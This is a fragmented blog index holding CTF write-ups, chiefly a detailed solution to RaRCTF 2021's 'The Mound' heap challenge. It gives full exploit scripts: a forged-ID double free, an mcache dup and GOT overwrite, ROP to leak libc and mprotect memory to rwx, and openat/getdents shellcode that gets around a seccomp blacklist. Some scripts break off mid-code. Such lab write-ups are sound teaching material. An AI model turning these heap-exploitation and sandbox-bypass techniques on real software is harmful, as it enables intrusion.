I‚Äôll need to dive deeper into the mound implementation. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:2:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mound The mound is kind of like the glibc heap, if it had nothing but the tcache. At the start of the program, the mound grabs two big memory spaces from mmap: 0x00000beef0000000 0x00000beef0400000 0x0000000000000000 rw- 0x00000dead0000000 0x00000dead0009000 0x0000000000000000 rw- 0xbeef* stores the actual data distributed by mmalloc; I‚Äôll call it mound_data. At the beginning of its life, the entirety of the mound_data segment constitutes the ‚Äútop chunk‚Äù of the mound. 0xdead* stores the metadata for the mound, kind of like what main_arena does in glibc. The structure looks something like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 mound_metadata mound_arena; // cs:0xdead0000000 The new types in there are further defined like so: typedef struct mchunk { size_t id; // rand64() id. size_t sz; // the chunk size (inclusive of metadata) char data[0]; // length is dependent on the size provided to mmalloc() } typedef struct mcache_entry { struct mchunk; // i.e. extend/inherit the mchunk structure here mcache_struct *mcache; // a copy of the mcache for safety verification mcache_entry *next; // next mcache entry; this is a linked list like the tcache. } #define MCACHE_MAX_BINS 0x18 typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } The most interesting part of each mchunk is (in my opinion, anyway) the id element. Every chunk is assigned a random 64-bit UUID (with a very small chance of collision2) upon allocation. When a chunk is freed, that ID gets chucked into the mound_metadata to protect the program against a double-free. This might make a lot more sense if I give a flowchart of how things work: Relevant macros: #define request2size(x) ((-x\u00260xf)+x+0x10) // x rounded up to nearest 0x10, plus 0x10. Applies for -ve numbers too. #define csize2midx(x) ((x\u003e\u003e4)-2) #define chunk2mem(p) ((void*)p+0x10) #define mem2chunk(p) ((void*)p-0x10) I copied and adapted some of these to python as well: def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) With this high-level overview of the implementation in mind, I can return to the previous question: What are the consequences of sending a glibc heap pointer to mfree()? ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:3:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mixing heap allocators Simply freeing a glibc heap pointer will almost certainly produce an exit(1): 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 1 Pile: hi Pile index: 0 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 4 Pile index: 0 Mound: Double free detected The relevant part of the code to check is the find_id(c-\u003eid) call: void find_id(size_t id) { for ( int i = 0; i \u003c= 4095; ++i ) if ( id == mound_arena.ids[i] ) { puts(\"Mound: Double free detected\"); exit(1); } } A typical malloc_chunk looks like this: struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; }; Because c-\u003eid occupies the same space as a malloc_chunk‚Äôs mchunk_prev_size member, the prev_size of the glibc heap chunk is taken as the id in find_id. The glibc chunk pointers allocated by strdup() will never be free, so prev_size == id should always be 0, and find_id(c-\u003eid) should always result in an error given a glibc heap chunk. Or not. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:3:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"The Obvious Solution It takes me a while, but I eventually realise that the preceding paragraph is false. Sequential malloc chunks can use the prev_size field to store user data: This means that if I call strdup(\"A\"*0x17) twice in succession, the first strdup() chunk allocated can be used to overwrite the prev_size of the 2nd strdup() chunk: strdup(b''.rjust(0x17,b'a'), 0) strdup(b''.rjust(0x17,b'a'), 1) edit(0, b''.rjust(0x17,b'a')) Using this method, the interpreted mchunk-\u003eid for a glibc heap chunk can be modified to any value within range(0, 1\u003c\u003c56). # register an arbitrary 56-bit id onto the mound's free id list def reg_id(id: int): strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(id)[:7].rjust(0x17, b'a')) free(0) What are the consequences of this? Adding a new id to mound_arena.ids[] is pretty useless; it would only make allocations harder instead of easier. I could also try to get rid of an ID: def r64(): return randint(0, (1\u003c\u003c64)-1) # generate random ids. Unrelated to rand64bit() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(r64())[:7].rjust(0x17, b'a')) free(1) edit(0, pack(id)[:7].rjust(0x17,b'a')) add(0x10, 2, b'a'*0x10) Then I‚Äôd be able to free the same region of memory twice, like this: from ctypes import CDLL libc = CDLL('libc.so.6') # r = ... libc.srand(libc.time(0)^r.pid) # pid will have to be guessed on remote def rand64bit(): return libc.rand() + (libc.rand()\u003c\u003c32) # ... omitted code ... # ... make sure to account for rand() calls throughout code as well ... while 1: add(sz=0x20, idx=0xf, b'hi') if not ((chunk_id := rand64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) This is a classic tcache dup, except with the mcache instead. Once you accomplish this much, getting to win() isn‚Äôt much of a challenge. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:4:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting to win() Right now, mcache-\u003eentries[1] == [arr[0xf] -\u003e arr[0xf]]. arr[0xf]-\u003enext can be modified to anything, so long as (mcache_entry*)(arr[0xf]-\u003enext)-\u003emcache == mound_arena.mcache. Taking a hint from the the definition, I‚Äôll try to point -\u003enext to mound_arena.mcache-0x10, because it‚Äôs the only non-user-controlled region that happens to have an mcache pointer. add(0x20, 0xe, fit(0xbeef0000010, 0xdead0007ff8)) The linked list here is now [arr[0xf] -\u003e mound_arena+0x7ff8]. As a reminder, the mound_arena looks like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 Right after the mcache is the top pointer. Pulling two items off of the mcache linked list will get the top pointer overwritten with user-controllable data: add(0x20, 0xd, 'hi') add(0x20, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) Here, I‚Äôm overwriting mound_data.top with a GOT pointer to gain RIP control: add(0x40, 0xb, pack(context.binary.sym.win)) # this will overwrite got.scanf() And now the exploit reaches win(): Simple enough, right? ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:4:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"On the lengths I will go to fool myself: a novel, inferior exploit approach Picture this: it‚Äôs the middle of a Saturday afternoon. I‚Äôm looking at gdb in one window, and vim in the next. There‚Äôs a little voice at the back of my head pleading me to attend to lunch and other bodily needs, but my eyes are entranced by the dark abyss of the Hex-Rays‚Ñ¢ decompiler. In short, I‚Äôm not really thinking straight. But what I do notice, in my digital stupor, are the comments I have open in Pseudocode-Q3: I had dismissed the immediate relevance of strdup() with the false reasoning I‚Äôd demonstrated at the end of this section. I even got to work on rationalizing the apparent irrelevancy of case 1/3; my writeup had these lines at one point: It‚Äôs reasonable to assume that strdup() was introduced explicitly as an exploit vector for the challenge, so I can expect that there‚Äôs a way to edit mchunk_prev_size without calling free(). On a wild guess, I expect that the final exploit involves modifying sizes[idx] and overflowing into glibc chunk metadata via case 3. Since there‚Äôs currently no way to move forward with case 1/3, I‚Äôll shift my focus to the other two cases. The bug I spotted here proved to be unnecessary. Altogether, you can solve the challenge without ever noticing the odd behaviour associated with mmalloc(0). Nonetheless, the resulting exploit I cobbled together is interesting, unique enough that I‚Äôd prefer to leave the details available to the public. So, let‚Äôs talk about mmalloc(). ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:5:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"mmalloc() and mfree() mmalloc() is only ever called in case 2: case 2: // add if ( user_sz \u003c= 0xFFF ) { // ... omitted ... if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; mmalloc() itself is defined a little oddly: __int64 *mmalloc(int user_sz) { int chunk_sz = request2size(user_sz); if ( chunk_sz \u003c 0 ) // not sure what the purpose of this is chunk_sz = (-user_sz \u0026 0xF) + user_sz + 31; int midx = csize2midx(chunk_sz); if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } If I expand the macros, the bug becomes more obvious: __int64 *mmalloc(int user_sz) { // 0 \u003c= user_sz \u003c= 0xfff int chunk_sz = (-user_sz\u00260xf)+user_sz+0x10; // 0x10 \u003c= chunk_sz \u003c= 0x1010 if ( chunk_sz \u003c 0 ) /* { ... } ignore */ int midx = (chunk_sz\u003e\u003e4)-2; // -1 \u003c= midx \u003c= 0xff if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) // possible negative index here!!! return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } As a reminder, the mcache is structured like this: typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } mcache-\u003eentries[-1] really refers to mcache-\u003ecounts[0x10:0x18]. By filling up the mcache bins for 0x120 \u003c= chunk_sz \u003c 0x1a0, we can get mcache-\u003eentries[-1] to point to any arbitrary location. The subsequent call to mmalloc_alloc(0) has a small safety check, as I showed earlier in the flowchart: __int64 *mcache_alloc(int user_sz) { // user_sz = 0 mcache_struct *mcache_ = mcache; // [rsp+30h] [rbp-10h] int midx = csize2midx(request2size(user_sz)) // midx = -1, [rsp+2Ch] [rbp-14h] mcache_entry *e = mcache-\u003eentries[midx]; // [rsp+20h] [rbp-20h] mcache-\u003eentries[midx] = (mcache_entry *)e-\u003efd; --mcache_-\u003ecounts[midx]; if ( mcache_ != (mcache_struct *)e-\u003emcache ) { // ! need to ensure that (void*)entries[-1][2] == mcache puts(\"Mcache: Invalid verify\"); exit(1); } e-\u003efd = e-\u003emcache = 0LL; remove_id(e-\u003eid); return \u0026e-\u003emcache; } This effectively means that mcache-\u003eentries[-1] needs to point to a known region of user-controlled data, like the mound. I‚Äôll use this bug to allocate a fake chunk with a valid mcache size. def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=0xbeef0000010): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(0x20, 0, fake_mcache_entry(0x100)) add(1, 1, b'a') # chunk to be overflowed fake_mcache_addr = 0xbeef0000100 for i,b in enumerate(pack(fake_mcache_addr)): chunk_sz = 0x120+i*0x10 user_sz = chunk_sz - 0x10 # TODO: how to get b \u003e 0xf? for i in range(b): add(user_sz, 0xf-i, b'garbage') for i in range(b): free(0xf-i) add(0, 2, b'') # trigger bug free(0) There‚Äôs a TODO in there, and I‚Äôll explain. The problem with incrementing mcache-\u003ecounts[0x10:0x18] one-by-one is that there aren‚Äôt enough pointers to go around. By right, if sizeof(arr[]) is only 0x10, the maximum value for mcache-\u003ecounts[] should be 0x10 as well. I struggled with this for a while. The only way to put more pointers onto the mcache is to do a double-free, but the ID verification list got in the way of that. It was about at this point that I gained a partial understanding of the strategy outlined in Fake IDs, and I started work on an odd, roundabout method of achieving much of the same4: # The substance of the exploit: getting mcache-\u003eentries[-1] to point to a fake mchunk for midx,b in tqdm((i+midxs.entries,b) for i,b in enumerate(pack(mound_data.fakechunk)) if b): def pad(s: bytes): return s.rjust(0x17, b'a') strdup(pad(b''), 0xf) # Remember that maximally, user_sz = 8 (mod 0x10) for a given glibc heap chunk. strdup(pad(b''), 0xe) # A string has a trailing nul-byte, so maximally strlen(s) = 7 (mod 0x10) add(midx, 2, b'hi') while (pred := r64bit())\u003e\u003e56: add(midx, 2, b'hi') for _ in range(b): # continually double-free to boost -\u003ecounts[] free(2) edit(0xf, pad(pack(r64())[:7])) free(0xe) edit(0xf, pad(","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:5:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Using win() The seccomp filter for this challenge is mildly interesting. Normally, seccomp‚Äôd binaries have a whitelist for permitted syscalls, but in this situation, there‚Äôs only a blacklist against a few. The blacklisted items give pause for thought: both execve and open are banned, and normally you‚Äôd use the former to pop a shell, and the latter for an open-read-write chain. But before I get ahead of myself, let‚Äôs talk about how to get to arbitrary syscalls first. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:6:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Moving to rwx There aren‚Äôt a lot of gadgets in the main binary, so it might be better to leak libc first. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['read'] = unpack(r.recvline()[:6], 'all') Once that‚Äôs done, I can abuse gadgets in libc to convert the mound_data memory region into an rwx page: R = ROP(context.libc) R.raw(0x48*b'a') R.mprotect(mound_data.base, 0x400000, 7) R.call(mound_data.shellcode) r.sendlineafter(';)\\n', R.chain()) This only makes sense if mound_data.shellcode actually points to an area of user-written shellcode. I handled this by writing shellcode to mound_data using add(), long before the mcache dup happens: # ... everything up until the first few add() calls ... sc = ... # I'm about to cover this part. sc = asm(sc) # don't call asm() twice add(len(sc), 8, sc) # dump shellcode somewhere in mound_data for later use # ... everything else, e.g. getting mcache dup ... Figuring out what shellcode to run isn‚Äôt too difficult, if you have a syscall reference in hand. This challenge shows why you shouldn‚Äôt use a seccomp blacklist: open might be banned, but openat certainly isn‚Äôt. I‚Äôll start off with some shellcode to open the /pwn/ folder: sc = shellcraft.pushstr('/pwn') sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) sc+= 'mov QWORD PTR [{}], rax\\n'.format(0xbeef0000000) sc+= shellcraft.getdents64('rax', 0xbeef0010000, 0x10000) # use getdents() to list a directory After that, I‚Äôll apply a basic assembly loop to search for .txt: sc+= shellcraft.mov('rax', 0xbeef0010000) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(u32('.txt')) sc+= 'jne loop\\n' # End result: *(int*)rax == u32(\".txt\") Since the flag‚Äôs filename is always 0x20+4 bytes long, the beginning of the flag filename will be at rax-0x20 , and I can use openat again to write the flag to stdout: sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(0xbeef0000000) sc+= shellcraft.openat('rax', 'rbx', 0) # i.e. shellcraft.cat('rbx'), but sc+= shellcraft.read('rax', 0xdead0000000, 100) # because pwntools uses SYS_open sc+= shellcraft.write(1, 0xdead0000000, 100) # I have to do this in 3 lines. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:6:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting the flag For reference, this is what the full script should look like at this point: from random import randint from collections import namedtuple from ctypes import CDLL from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers O_DIRECTORY, FLAG_LEN = 0x10000, 100 # use reasonably long values here sc = '' # step 1: getting a directory listing sc+= shellcraft.pushstr('/pwn') # put \"/pwn\" on the stack sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) # use openat in lieu of open. rsp because of pushstr sc+= 'mov QWORD PTR [{}], rax\\n'.format(mound_data.base) # Store the resultant fd _somewhere_ accessible (mound_data.base) sc+= shellcraft.getdents64('rax', mound_data.dents, 0x10000) # use getdents to list directory # step 2: loop through the dents data to find the flag filename sc+=shellcraft.mov('rax', mound_data.dents) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(hex(u32('.txt'))) sc+= 'jne loop\\n' # step 3: open the flag file, read to _somewhere_ (mound_arena.base), and write to stdout sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(mound_data.base) sc+= shellcraft.openat('rax', 'rbx', 0) sc+= shellcraft.read('rax', mound_arena.base, FLAG_LEN) sc+= shellcraft.write(1, mound_arena.base, FLAG_LEN) sc = asm(sc) # don't call asm() twice add(1+csize2midx(request2size(len(sc))), 8, sc) # dump shellcode somewhere in mound_data for later use # The Obvious Solution: mcache dup --\u003e mound_arena.top overwrite --\u003e GOT table edit to win() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 5) strdup(b'a'*0x17, 6) edit(midxs.prev_size_editor, pack(r64())[:7].rjust(0x17, b'a')) free(midxs.fakeid_provider) edit(midxs.prev_size_editor, pack(id)[:7].rjust(0x17,b'a')) add(midxs.strdup, 7, b'a'*0x10) for _ in range(3): r64bit() # There have been 3 rand64bit() calls so far; account for them. while 1: # try adding until there's an ID with a null MSB add(midxs.mcache_dup, 0xf, b'hi') if not ((chunk_id := r64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) # mcache dup add(midxs.mcache_dup, 0xe, fit(mound_data.mcache, mound_arena.mcache-0x10)) # overwrite -\u003enext add(midxs.mcache_dup, 0xd, 'hi') add(midxs.mcache_dup, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) # overwrite .top add(midxs.got_overwriter, 0xb, pack(context.binary.sym.win)) # overwrite got['scanf'] # win() will execute. Leak libc in the first cycle. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['rea","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:6:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mistakes [Content warning: unsubstantiated opinions] ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:7:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"I. Pwn isn‚Äôt RE CTF pwn binaries are usually small enough to fully reverse engineer, and The Mound was no exception. But the reversing effort always arrives with the cost of Time. The entire section of this writeup dedicated to understanding the heap implementation was written during the 36-hours between me starting this challenge and mound.py spitting out the flag. The assumption I‚Äôve been rolling with, in all of the pwnables do, is that boosting time(reversing binaries) will pay off by a comparable reduction in time(scripting and debugging). That belief didn‚Äôt work out for this challenge. At the end of the main() reversing effort, I noted that I observed a few Bad Things going on in the switch-cases. So I spent a thousand-or-so words reversing the interworkings of the mound to understand that sending a glibc pointer to mfree() tends to produce Double free exit(1) calls as a result of a null prev_size. Do you know how else I could‚Äôve discovered that? By just testing out the damn thing and getting a backtrace: gdb.attach(r, gdbscript='b exit\\nc') strdup(b'hi', 0) free(0) r.interactive() Oh, look! It stops in find_id(). Which only stops because *((void*)p-0x10) == NULL for the p in mfree(p). So I should probably find a way to edit prev_size for one of the strdup()‚Äôd pointers. Five minutes to figure out something I spent 5 hours in IDA Pro for. There are situations where a myopic focus on testing crashes might not work out, but The Mound is certainly not one of them. I can‚Äôt speak for ptr-yudai, but judging by his long article on adapting fuzzing techniques for CTF pwnables, I expect that there‚Äôs a lot more to gain from a lucid application of dynamic analysis than there is from my oddball approach of eyeballing everything I can in IDA until something sticks. I might re-evaluate this section if someone comes around with a really fast CTF Reversing strategy, but until then: ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:7:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"II. Pattern matching CTF challenges are full of patterns and trends. When one popular CTF introduces a unique challenge, other CTFs tend to ape6 after the original design. v8 challenges are a good example of this: Prior to 2018, nothing. This year, there‚Äôs already been 4+ CTFs with v8 challenges. Compare this with a graph of Chrome‚Äôs market share: The IRL relevance of v8 hasn‚Äôt changed (much), so what gives? There‚Äôs a good comparison to be made between CTF trends and memetic reproduction. An established CTF comes up with an interesting challenge design. A decade or so ago, this might‚Äôve been ‚ÄúReturn Oriented Programming‚Äù. Go back a few years and you‚Äôll see everyone interested in nifty House of * exploits. In the past few years, there‚Äôs been an obsession with things like v8 oobs and printf() one-shots. This is an intentionally broad picture; the trends I‚Äôve listed here are cherry-picked obvious ones. There are smaller, less identifiable trends, and these weaker trends are a part of why I went down the weird exploit path I did for The Mound. Instinctively, I try to pull meta-games using the trends I observe. If it‚Äôs a v8 challenge, I try to get an oob JSArray, even though that kind of stuff is a lot harder with contemporary security measures. If there‚Äôs a text input, I‚Äôll bash in \"A\"*0x1000 for the sake of it. And if there‚Äôs a special number that‚Äôll produce a negative array index ‚Äî a smaller pattern that I‚Äôve unfortunately internalised ‚Äî I‚Äôll do my best to shape my exploit into abusing it, even if I have to use more powerful primitives to get there. It was with this bias that I approached The Mound, even after I learnt how to double-free a mound allocated chunk. I understood on a subconscious level that a double-free was almost certainly a more powerful tool than what I wanted to swing it around for (incrementing mcache-\u003ecounts[]), but if it follows what I‚Äôve seen before, I have an expectation that things will go the same way. I‚Äôll admit that this is a little bit theoretical, but I would have saved a lot of time if I could‚Äôve just convinced myself to abort with the mcache-\u003eentries[-1] exploit path early on. I‚Äôm not exactly sure what I can do to prevent this kind of thing in the future, either. Something that deserves more thought. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:7:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"III. Things I haven‚Äôt considered? I could be doing pwn in sub-optimal ways I can‚Äôt identify as sub-optimal on my own. I‚Äôm hoping that other writeups on this challenge (if they arrive) can provide the kind of external insight on how challenges can be solved faster. That‚Äôs it. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:7:3","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Footnotes This isn‚Äôt particularly useful. There‚Äôs no way to leak pointers outside of win(). I tried looking for seeds that would produce repeated cycles: from ctypes import CDLL LIBC = CDLL('libc.so.6') t = LIBC.time(0) t \u0026= 0xffffffffffff0000 for i in range(t,t+0xffff): LIBC.srand(i) seen = set(LIBC.rand() for j in range(0x1000)) if len(seen) \u003c 0xff0: print(i, len(seen)) The script found nothing. In case you‚Äôre wondering how there‚Äôs a pseudocode reference to mound_arena.mcache-\u003eentries[], as opposed to an ugly red *(_QWORD *)(MEMORY[0xDEAD0008008] + 8 * (v3 + 2LL) + 8) reference: Define the mound_metadata class (and the other structs from here) in the Structures tab; you should see an entry like this in the local types tab (Shift+F1): In the IDA View tab, select Edit --\u003e Segments --\u003e Create Segment; fill the pop-up window with sensible values put a variable at mound_arena:00000DEAD0000000 and retype it (Y) as a mound_metadata. The code block there isn‚Äôt supposed to make sense. Throughout the writeup, I‚Äôve tried to keep declarations and variables consistent across code snippets, but getting this code to match with everything else in the writeup is just a little bit intractable. This is the reason why I ended up searching for the intended solution. My silly alternative method for getting to win() doesn‚Äôt work on remote; the time cost associated with a single connection ‚Äì let alone bruteforcing the PID ‚Äì makes it impossible to increment mcache-\u003eentries[-1] without an absurdly low ping. The 30x number comes from a crude measure of how many times the exploit calls choose(). For the intended solution, it‚Äôs about a hundred. The negative indexing process takes around ~3000 calls on average, and this shakes out to an exploit duration of around 15 minutes per guess on remote. Feel free to try it out youself: from random import randint from collections import namedtuple from ctypes import CDLL from tqdm import tqdm from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) if args.REMOTE: r = remote('193.57.159.27', 41932) #r = remote('localhost', 8329) libc.srand(t^int(args.PID)) # bruteforce PID else: r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers midxs = namedtuple('midb', 'first_alloc overflower incrementer fakechunk bugged got_overwriter entries')(1, 4, 0, 2, -1, 3, 0x10) mound_data = namedtuple('beef', 'base mcache fakechunk dents shellcode')(BEEF, BEEF+0x10, BEEF+0x100, BEEF+0x10000, BEEF+0x190) def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=mound_data.mcache): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(midxs.first_alloc, 0, fake_mcache_entry(sz=midx2csize(midxs.fakec","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:8:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Understanding C++ move semantics in the context of a CTF challenge.","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Like most beginners in pwn, I‚Äôve only a passing familiarity with cpp binary exploits1. This writeup targets beginners with little-to-no C++ exploitation background, and you can skip to the TL;DR at the end if you just want the solution. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:0:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Challenge details Author: NotDeGhost When in doubt, hijack a vtable nc mc.ax 31707 Files: Dockerfile (implies libc6_2.27-3ubuntu1.4_amd64) Makefile ( -O3 -static-libstdc++ 